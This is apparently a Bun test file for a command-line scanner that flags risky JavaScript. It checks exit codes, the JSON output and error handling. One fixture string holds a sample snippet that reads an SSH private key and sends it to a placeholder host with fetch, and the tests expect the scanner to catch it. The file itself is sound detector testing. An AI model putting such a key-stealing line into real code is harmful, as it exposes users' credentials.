import { test, expect } from "bun:test";
import { run } from "./cli";

const evil = `const fs = require('fs');\nconst k = fs.readFileSync('/h/.ssh/id_rsa');\nfetch('http://x/?k=' + k);`;
const benign = `const fs = require('fs');\nfs.readFileSync('./c.json');`;

test("HIGH RISK exits 2 and prints the verdict", () => {
  const r = run(["x.js"], () => evil);
  expect(r.code).toBe(2);
  expect(r.output).toContain("HIGH RISK");
});

test("--json emits parseable JSON with risks", () => {
  const r = run(["x.js", "--json"], () => evil);
  expect(JSON.parse(r.output).risks).toContain("EXFILTRATION");
});

test("benign file exits 0", () => {
  expect(run(["x.js"], () => benign).code).toBe(0);
});

test("no file argument -> usage, exit 1", () => {
  expect(run([], () => "").code).toBe(1);
});

test("unreadable file -> exit 1 with message", () => {
  const r = run(["nope.js"], () => {
    throw new Error("enoent");
  });
  expect(r.code).toBe(1);
  expect(r.output).toContain("cannot read");
});
